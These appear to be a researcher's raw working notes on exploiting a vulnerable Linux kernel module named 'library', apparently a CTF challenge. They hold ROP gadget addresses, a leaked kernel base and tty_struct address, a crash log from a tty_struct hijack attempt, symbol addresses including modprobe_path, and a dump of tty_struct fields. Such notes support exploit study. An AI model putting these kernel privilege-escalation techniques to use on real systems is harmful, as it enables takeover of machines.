ROP

0xffffffff810067e0 leave+ret

0xffffffff8113e9b0: mov qword [rdx], rsi ; ret  ;  (2 found)
0xffffffff81018c30: mov qword [rsi], rdx ; ret  ;  (4 found)

******************
  ulong rop_start = tty_addr + 0x100;
[!] kbase: 0xffffffff81000000
[!] tty_struct : 0xffff88800729c800

kernel tried to execute NX-protected page - exploit attempt? (uid: 0)
BUG: unable to handle page fault for address: ffff88800729c900
#PF: supervisor instruction fetch in kernel mode
#PF: error_code(0x0011) - permissions violation
PGD 1a00067 P4D 1a00067 PUD 1a01067 PMD 720a063 PTE 800000000729c063
Oops: 0011 [#1] PTI
CPU: 0 PID: 43 Comm: exploit Tainted: G           O      5.9.10 #5
RIP: 0010:0xffff88800729c900
Code: ff ff 00 c9 29 07 80 88 ff ff 00 c9 29 07 80 88 ff ff 00 c9 29 07 80 88 ff ff 00 c9 29 07 80 88 ff8
RSP: 0018:ffffc90000087e60 EFLAGS: 00000286
RAX: ffff88800729c900 RBX: 00000000dead6ae6 RCX: 00000000deadbeef
RDX: 00000000cafebabe RSI: 00000000deadbeef RDI: ffff88800729c800
RBP: ffffc90000087ef8 R08: 00000000cafebabe R09: ffff88800729c800
R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
R13: 00000000cafebabe R14: ffff88800729c800 R15: ffff8880003d0b00
FS:  00000000011c7300(0000) GS:ffffffff81832000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffff88800729c900 CR3: 0000000007232000 CR4: 00000000001006b0
Call Trace:
 ? tty_ioctl+0x56f/0x780
 ? hrtimer_nanosleep+0xa1/0x110
 ? hrtimer_init_sleeper+0x30/0x30
 __x64_sys_ioctl+0x7b/0xb0
 do_syscall_64+0x36/0x80
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x4596bb


*********************

0xffffffff8114f260 T tty_ioctl
0xffffffff81837d00 D modprobe_path


0xffffffff81000000 T _text

0xffffffffc00002c6 t library_open [library]
0xffffffffc0000000 t remove_all   [library]
0xffffffffc00002de t library_release      [library]
0xffffffffc0000040 t library_ioctl        [library]
0xffffffffc0002140 d ioctl_lock   [library]
0xffffffffc0002120 d remove_all_lock      [library]
0xffffffffc00002fb t library_ioctl.cold   [library]
0xffffffffc0002020 d library_fops [library]
0xffffffffc0002410 b major        [library]
0xffffffffc0002408 b __key.26482  [library]
0xffffffffc0002408 b library_class        [library]
0xffffffffc0002408 b __key.26484  [library]
0xffffffffc0002408 b __key.26485  [library]
0xffffffffc00012fc r _note_7      [library]
0xffffffffc0002180 d __this_module        [library]
0xffffffffc0002400 b root [library]
0xffffffffc0002000 d counter      [library]

[0x020] 00000100
[0x038] ffff888006912438
[0x040] ffff888006912438
[0x048] ffff888006912448
[0x050] ffff888006912448
[0x058] ffff888006862320
[0x068] ffff888006912468
[0x070] ffff888006912468
[0x080] ffff888006912480
[0x088] ffff888006912480
[0x098] ffff888006912498
[0x0a0] ffff888006912498
[0x0b8] ffff8880069124b8
[0x0c0] ffff8880069124b8
[0x0d0] ffff8880069124d0
[0x0d8] ffff8880069124d0
[0x0e8] 000000bf
[0x0f0] 10004157f1c0300
[0x0f8] 170f12001a131100
[0x100] 960000000016
[0x108] 00009600
[0x140] 3635326d7470
[0x190] 00010801
[0x198] 00000001
[0x1c8] ffff888006912000
[0x1d8] ffff8880069125d8
[0x1e0] ffff8880069125d8
[0x1e8] ffff8880069125e8
[0x1f0] ffff8880069125e8
[0x1f8] fffffffe0
[0x200] ffff888006912600
[0x208] ffff888006912600
[0x210] ffffffff8114fc00
[0x218] ffffc90000891000
[0x220] ffff888000165880
[0x228] ffff888006843b30
[0x230] ffff888006843b30
[0x250] fffffffe0
[0x258] ffff888006912658
[0x260] ffff888006912658
[0x268] ffffffff8114ec30
[0x270] ffff88800690a600

>>> some = 0xffffffff8114fc00
>>> kbase = 0xffffffff81000000
>>> hex(some - kbase)
'0x14fc00'
